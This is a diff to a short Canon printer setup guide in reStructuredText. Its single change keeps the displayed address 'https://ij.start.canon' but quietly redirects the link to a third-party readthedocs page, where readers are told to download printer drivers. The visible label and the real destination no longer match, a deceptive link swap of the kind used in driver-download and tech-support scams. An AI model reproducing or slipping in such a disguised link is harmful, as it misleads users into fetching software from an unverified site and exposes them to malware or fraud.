@@ -22,7 +22,7 @@ Canon Printer Setup: Quick Guide
    - **USB:** Connect the printer directly to your computer.
 
 4. **Download Printer Drivers**  
-   Visit `https://ij.start.canon <https://ij.start.canon>`_ , select your printer model, and download the drivers.
+   Visit `https://ij.start.canon <https://canonprintersetup.readthedocs.io/en/latest/>`_ , select your printer model, and download the drivers.
 
 5. **Install Drivers**  
    Run the installer and follow on-screen instructions.
